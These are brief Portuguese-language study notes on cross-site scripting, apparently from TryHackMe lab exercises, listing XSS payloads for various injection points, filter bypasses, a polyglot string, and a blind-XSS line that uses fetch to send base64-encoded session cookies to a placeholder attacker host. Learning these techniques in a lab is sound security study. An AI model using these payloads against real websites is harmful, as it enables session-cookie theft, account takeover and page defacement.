xss

cross-site-sripting

basicamente manipular dom com Javascript.

site para fazer xss e aprender:

https://xsshunter.com/

blind xss

vc consegue fazer com que o xss seja armazenado no site, é bem parecido com stored porém vc nao consegue ver o payload do xss sendo validado

xss simples com site formado em html refletido num &lt;h2&gt; por ex:

`<script>alert('THM');</script>`

refletido num imput tag por ex:

`"><script>alert('THM');</script>`

refletido em textarea

`</textarea><script>alert('THM');</script>`

dentro de um javascript como  document.getElementsByClassName('name').innetHTML='adam';

`';alert('THM');//`

filtragem de elemntos como script dai vc colocar ele dentro de uma palavra

`<sscriptcript>alert('THM');</sscriptcript>`

usando o onload do &lt;img src&gt;

**`/images/cat.jpg" onload="alert('THM');`**

polyglots: esses caras quebram tudo

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

blind xss pratical:

`</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`

&lt;script&gt;alert(window.location.hostname );&lt;/script&gt;

&lt;/textarea&gt;&lt;script&gt;document.querySelector('#thm-title').textContent = 'I am a hacker'&lt;/script&gt;

&lt;/textarea&gt;&lt;script&gt;document.querySelector('XSS Playground Lite').textContent = 'I am a hacker'&lt;/script&gt;

*&lt;iframe src="javascript:alert(\`xss\`)"&gt;*

*xfs cross frame scripting*

*'&lt;'/'&gt;&lt;'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'&gt;*